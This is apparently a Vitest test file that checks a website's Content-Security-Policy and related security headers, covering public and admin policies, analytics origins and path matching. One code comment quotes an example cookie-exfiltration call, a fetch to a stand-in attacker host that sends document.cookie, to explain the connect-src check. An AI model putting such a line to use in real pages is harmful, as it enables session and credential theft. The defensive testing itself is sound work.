import { describe, expect, it } from 'vitest'
import { BASE_HEADERS, adminCsp, publicCsp, securityHeaders } from './security-headers'

/**
 * The Content-Security-Policy, and the four headers that were already there.
 *
 * A policy is the kind of thing that is either subtly wrong or silently
 * permissive, and a build tells you neither. These check the clauses that do the
 * work, not that the string is long.
 */

/** `default-src 'self'` -> ["'self'"] */
const directive = (csp: string, name: string): string[] | null => {
  const found = csp
    .split(';')
    .map((part) => part.trim())
    .find((part) => part === name || part.startsWith(`${name} `))
  if (found === undefined) return null
  return found.slice(name.length).trim().split(/\s+/).filter(Boolean)
}

describe('the public policy', () => {
  const csp = publicCsp(undefined, true)

  it('falls back to itself rather than to nothing', () => {
    expect(directive(csp, 'default-src')).toEqual(["'self'"])
  })

  /**
   * The clause that decides what an injected script can do with what it steals.
   * Without it, `fetch('https://attacker.example', { body: document.cookie })`
   * is permitted by default-src's fallback only if that fallback is 'self' - so
   * this is really a check that connect-src is stated rather than inherited.
   */
  it('names where a script may send data', () => {
    expect(directive(csp, 'connect-src')).toEqual(["'self'"])
  })

  it('cannot be framed at all', () => {
    expect(directive(csp, 'frame-ancestors')).toEqual(["'none'"])
  })

  it('refuses plugin objects', () => {
    expect(directive(csp, 'object-src')).toEqual(["'none'"])
  })

  /**
   * An injected `<base href>` re-points every relative URL on the page, which is
   * the usual way an inline-script foothold becomes a full takeover.
   */
  it('pins the base URI', () => {
    expect(directive(csp, 'base-uri')).toEqual(["'self'"])
  })

  it('stops a form being posted to somebody else', () => {
    expect(directive(csp, 'form-action')).toEqual(["'self'"])
  })

  it('upgrades any http subresource', () => {
    expect(directive(csp, 'upgrade-insecure-requests')).toEqual([])
  })

  /**
   * Documented rather than aspirational: script-src allows unsafe-inline
   * deliberately, because the alternative is a per-request nonce and that would
   * make every page dynamic. If this ever changes, the note in
   * security-headers.ts has to change with it.
   */
  it('allows inline script, which is the accepted trade', () => {
    expect(directive(csp, 'script-src')).toContain("'unsafe-inline'")
  })

  it('does not allow eval, which only the admin panel needs', () => {
    expect(directive(csp, 'script-src')).not.toContain("'unsafe-eval'")
  })

  /**
   * The exception that must never leak into a deployment. `next dev` compiles
   * through React Refresh, which evaluates strings, so the development policy
   * has to permit eval or hot reload stops working. Production does not use
   * eval and must not allow it, and the pair of assertions is what stops this
   * being "fixed" locally by loosening the wrong one.
   */
  it('allows eval in development, and only there', () => {
    expect(directive(publicCsp(undefined, false), 'script-src')).toContain("'unsafe-eval'")
    expect(directive(publicCsp(undefined, true), 'script-src')).not.toContain("'unsafe-eval'")
  })

  it('never widens a directive to a bare wildcard', () => {
    for (const part of csp.split(';')) {
      expect(part.trim().split(/\s+/), `"${part.trim()}" is a wildcard`).not.toContain('*')
    }
  })
})

describe('the analytics origin', () => {
  it('is allowed to load and to receive, when one is configured', () => {
    const csp = publicCsp('https://plausible.io/js/script.js', true)
    expect(directive(csp, 'script-src')).toContain('https://plausible.io')
    expect(directive(csp, 'connect-src')).toContain('https://plausible.io')
  })

  it('adds only the origin, never the path', () => {
    const csp = publicCsp('https://plausible.io/js/script.js', true)
    expect(csp).not.toContain('/js/script.js')
  })

  /**
   * A malformed value must not throw during a build and must not widen the
   * policy. Analytics simply stays blocked until it is a URL.
   */
  it('ignores a value that is not a URL', () => {
    const csp = publicCsp('not a url', true)
    expect(csp).toBe(publicCsp(undefined, true))
  })

  /**
   * The bug this file did not catch, and shipped.
   *
   * Umami loads its script from `cloud.umami.is` and posts every pageview to
   * `gateway.umami.is`. The first version of `analyticsOrigin` derived one
   * origin from the script URL and used it for both directives, so the script
   * loaded, `window.umami` appeared, and every send was refused by connect-src.
   * Nothing was visible on the page; it was found by reading the browser
   * console on production.
   *
   * The test above passes with Plausible either way, which is why it did not
   * help: Plausible reports to the host it is served from.
   */
  it('allows the host the data is sent to, which is not always the script host', () => {
    const csp = publicCsp('https://cloud.umami.is/script.js', true)
    expect(directive(csp, 'script-src'), 'script host').toContain('https://cloud.umami.is')
    expect(directive(csp, 'connect-src'), 'send host').toContain('https://gateway.umami.is')
  })

  it('sends every Umami region to the same gateway', () => {
    for (const host of ['cloud.umami.is', 'eu.umami.is', 'analytics.umami.is']) {
      const csp = publicCsp(`https://${host}/script.js`, true)
      expect(directive(csp, 'connect-src'), host).toContain('https://gateway.umami.is')
    }
  })

  it('does not invent a gateway for a provider that reports to itself', () => {
    const csp = publicCsp('https://plausible.io/js/script.js', true)
    expect(directive(csp, 'connect-src')).not.toContain('umami')
  })
})

/**
 * Cloudflare Web Analytics injects its beacon at the edge on a proxied zone.
 * The application never asks for it and cannot tell whether it is enabled, so
 * there is no variable to gate it on - and while it was missing from the policy
 * it produced a CSP error on every single page load in production.
 */
describe('the Cloudflare beacon', () => {
  it('is allowed even with nothing configured, because it is not ours to switch off', () => {
    expect(directive(publicCsp(undefined, true), 'script-src')).toContain(
      'https://static.cloudflareinsights.com',
    )
  })

  /** It posts to /cdn-cgi/rum on our own origin, so 'self' already covers it. */
  it('needs no connect-src entry of its own', () => {
    expect(directive(publicCsp(undefined, true), 'connect-src')).toEqual(["'self'"])
  })
})

describe('the admin policy', () => {
  it('allows eval, because Payload needs it', () => {
    expect(directive(adminCsp(), 'script-src')).toContain("'unsafe-eval'")
  })

  it('keeps every clause that does not depend on how the panel is built', () => {
    const csp = adminCsp()
    expect(directive(csp, 'frame-ancestors')).toEqual(["'none'"])
    expect(directive(csp, 'object-src')).toEqual(["'none'"])
    expect(directive(csp, 'base-uri')).toEqual(["'self'"])
    expect(directive(csp, 'form-action')).toEqual(["'self'"])
  })
})

describe('what next.config serves', () => {
  const entries = securityHeaders()

  it('sends all five headers on every entry', () => {
    for (const entry of entries) {
      const keys = entry.headers.map((h) => h.key)
      for (const required of [
        'Content-Security-Policy',
        'Strict-Transport-Security',
        'X-Frame-Options',
        'X-Content-Type-Options',
        'Referrer-Policy',
      ]) {
        expect(keys, `${entry.source} is missing ${required}`).toContain(required)
      }
    }
  })

  it('keeps the headers that were already there', () => {
    const first = entries[0]
    expect(first, 'securityHeaders returned nothing').toBeDefined()
    for (const base of BASE_HEADERS) {
      expect(first!.headers).toContainEqual(base)
    }
  })

  /**
   * The one that matters most, and the reason the public source is a negative
   * lookahead. A path served two Content-Security-Policy headers gets the
   * intersection of both, so an overlap here would apply the public script rules
   * to the admin panel and break it - while the build stayed green.
   */
  it('never serves a path two policies', () => {
    const publicEntry = entries.find((e) => e.source.includes('(?!'))
    expect(publicEntry, 'the public entry no longer excludes anything').toBeDefined()

    const pattern = new RegExp(`^${publicEntry!.source}$`)
    for (const adminPath of ['/admin', '/admin/', '/admin/collections/businesses']) {
      expect(pattern.test(adminPath), `${adminPath} also matches the public entry`).toBe(false)
    }
  })

  it('still covers the public paths it is supposed to', () => {
    const publicEntry = entries.find((e) => e.source.includes('(?!'))!
    const pattern = new RegExp(`^${publicEntry.source}$`)
    for (const path of [
      '/',
      '/directory',
      '/en/directory/hotel-albergo',
      '/g/K3M9QP2',
      '/administrators',
    ]) {
      expect(pattern.test(path), `${path} is not covered by the public policy`).toBe(true)
    }
  })
})
